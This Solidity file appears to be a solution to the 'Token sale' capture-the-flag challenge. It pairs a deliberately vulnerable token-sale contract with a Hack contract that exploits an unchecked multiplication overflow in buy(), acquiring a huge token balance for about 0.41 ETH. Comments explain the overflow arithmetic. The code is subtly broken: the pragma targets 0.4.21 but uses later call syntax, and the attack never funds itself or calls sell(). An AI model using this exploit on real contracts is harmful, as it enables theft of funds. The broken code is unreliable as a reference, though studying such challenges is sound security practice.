pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract Hack {
    TokenSaleChallenge tokenSale;
    uint256 public constant MAX_UINT_256_IS =
        115792089237316195423570985008687907853269984665640564039457584007913129639935;
    // so this will cause an overflow in the TokenSale contract since the number below with 18 more zeros is higher than the number above
    uint256 public constant OVERFLOW_AMOUNT =
        115792089237316195423570985008687907853269984665640564039458;
    // the caused overflow allows us to calculate the amount of wei we need to send which is. around 0.41 eth
    uint256 public constant WEI_AMOUNT_AFTER_OVERFLOW = 415992086870360064;

    constructor(address _tokenSale) public {
        tokenSale = TokenSaleChallenge(_tokenSale);
    }

    function attack() external {
        tokenSale.buy{value: WEI_AMOUNT_AFTER_OVERFLOW}(OVERFLOW_AMOUNT);
    }
}
